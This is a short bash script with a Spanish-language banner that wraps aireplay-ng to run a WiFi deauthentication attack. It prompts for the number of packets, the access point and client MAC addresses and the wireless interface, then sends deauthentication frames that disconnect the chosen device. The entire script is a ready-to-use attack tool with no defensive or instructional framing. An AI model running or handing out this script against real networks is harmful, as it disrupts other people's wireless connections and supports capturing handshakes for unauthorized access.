#!/bin/bash

echo -e "\n"
echo "*******************************************"
echo "***                                     ***"
echo "***     DESAUTENTICAR EQUIPOS WIFI      ***"
echo "***                                     ***"
echo "***   ​ᴄᴏᴘʏʀɪɢᴛʜ@𝟮𝟬𝟮𝟯        𝑪𝒉𝒆𝒌𝒂𝑾𝑯     ***"
echo "***                                     ***"
echo "*******************************************"

echo -e "\n"


read -p "➤➤➤ Escribe cuantos paquetes de desautenticación quieres enviar: " paquetes
read -p "➤➤➤ Dirección MAC del punto de acceso: " router
read -p "➤➤➤ Dirección MAC del dispositivo [Cliente]: " equipo
read -p "➤➤➤ Escribe el nombre de tu tarjeta de red wifi: " tarjetaredwifi

aireplay-ng -0 $paquetes -a $router -c $equipo $tarjetaredwifi
